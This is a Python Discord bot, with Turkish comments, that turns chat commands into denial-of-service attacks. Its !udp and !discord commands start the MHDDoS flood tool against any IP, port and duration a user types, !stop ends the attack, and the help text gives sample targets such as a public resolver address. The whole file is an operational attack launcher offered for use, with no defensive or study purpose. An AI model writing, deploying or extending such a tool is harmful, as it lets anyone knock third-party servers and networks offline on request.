import discord
import subprocess
import os
import asyncio
from discord.ext import commands

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Çalışan süreçleri takip etmek için sözlük
running_processes = {}

@bot.event
async def on_ready():
    print(f'Bot giriş yaptı: {bot.user}')
    print('------')
    # MHDDoS klasörünün varlığını kontrol et
    if not os.path.exists('./MHDDoS'):
        print("MHDDoS klasörü bulunamadı. Lütfen GitHub Actions'da klonlama adımını kontrol edin.")

@bot.command()
async def udp(ctx, ip: str, port: int, duration: int):
    """UDP saldırısı başlatır: !udp IP PORT SÜRE"""
    if ctx.author.id in running_processes:
        await ctx.send("Zaten çalışan bir saldırınız var!")
        return
    
    try:
        # Komutu çalıştır
        process = subprocess.Popen(
            ['python', 'start.py', 'udp', ip, str(port), str(duration)],
            cwd='./MHDDoS',
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        running_processes[ctx.author.id] = process
        await ctx.send(f"UDP saldırısı başlatıldı: `{ip}:{port}` - {duration} saniye")
    except Exception as e:
        await ctx.send(f"Hata: {str(e)}")

@bot.command()
async def discord(ctx, ip: str, port: int, duration: int):
    """Discord saldırısı başlatır: !discord IP PORT SÜRE"""
    if ctx.author.id in running_processes:
        await ctx.send("Zaten çalışan bir saldırınız var!")
        return
    
    try:
        # Komutu çalıştır (ts3 protokolü)
        process = subprocess.Popen(
            ['python', 'start.py', 'ts3', f"{ip}:{port}", '10000', str(duration)],
            cwd='./MHDDoS',
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        running_processes[ctx.author.id] = process
        await ctx.send(f"Discord saldırısı başlatıldı: `{ip}:{port}` - {duration} saniye")
    except Exception as e:
        await ctx.send(f"Hata: {str(e)}")

@bot.command()
async def stop(ctx):
    """Çalışan saldırıyı durdurur: !stop"""
    if ctx.author.id not in running_processes:
        await ctx.send("Durduracak saldırı bulunamadı!")
        return
    
    try:
        process = running_processes[ctx.author.id]
        process.terminate()  # Süreci sonlandır
        await asyncio.sleep(1)  # Sonlandırma için bekle
        
        if process.poll() is None:  # Hala çalışıyorsa
            process.kill()  # Zorla sonlandır
        
        del running_processes[ctx.author.id]
        await ctx.send("Saldırı durduruldu!")
    except Exception as e:
        await ctx.send(f"Hata: {str(e)}")

@bot.command()
async def help(ctx):
    """Yardım komutu"""
    help_text = """
**Komutlar:**
`!udp IP PORT SÜRE` - UDP saldırısı başlatır
`!discord IP PORT SÜRE` - Discord saldırısı başlatır
`!stop` - Çalışan saldırıyı durdurur
`!help` - Bu yardım mesajını gösterir

**Örnekler:**
`!udp 1.1.1.1 80 60`
`!discord 192.168.1.1 25565 120`
"""
    await ctx.send(help_text)

# GitHub Actions için token ortam değişkeninden alınır
bot.run(os.getenv('DISCORD_TOKEN'))
